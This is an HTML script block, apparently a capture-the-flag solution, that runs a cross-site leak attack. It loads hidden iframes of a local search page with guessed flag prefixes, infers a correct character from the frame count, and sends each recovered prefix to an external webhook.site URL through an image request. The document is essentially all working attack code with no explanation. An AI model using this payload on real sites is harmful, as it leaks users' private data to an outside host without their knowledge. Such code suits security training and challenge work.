<script>
(async () => {
    let flag = "REh7"; 
    flag = atob(flag);
    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f"; 

    while (!flag.includes("}")) {
        for (let c of "0123456789abcdef}") {
            let fr = document.createElement("iframe");
            fr.style.display = "none";
            document.body.appendChild(fr);

            await new Promise(next => {
                fr.onload = () => {
                    if (fr.contentWindow.frames.length) {
                        flag += c;
                        new Image().src = `${webhook}?d=${btoa(flag)}`;
                    }
                    fr.remove();
                    next();
                };
                fr.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
            });
            if (flag.endsWith(c)) break;
        }
    }
})();
</script>
